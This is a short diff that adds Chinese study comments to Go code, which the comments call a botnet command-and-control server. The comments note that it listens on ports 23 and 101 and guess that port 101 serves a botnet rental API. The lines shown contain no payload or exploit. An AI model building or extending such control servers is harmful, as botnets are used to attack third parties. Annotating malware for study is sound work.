@@ -7,6 +7,8 @@ import (
 	"time"
 )
 
+//程序入口，开启23端口和101端口的监听
+
 //c&c控制服务器【管理和控制代码】
 const DatabaseAddr string = "127.0.0.1"
 const DatabaseUser string = "root"
@@ -23,7 +25,7 @@ func main() {
 		return
 	}
 
-	api, err := net.Listen("tcp", "0.0.0.0:101") //101用作 API 处理。
+	api, err := net.Listen("tcp", "0.0.0.0:101") //101用作 API 处理。【应该是作为租售服务，对外开放的API接口】
 	if err != nil {
 		fmt.Println(err)
 		return
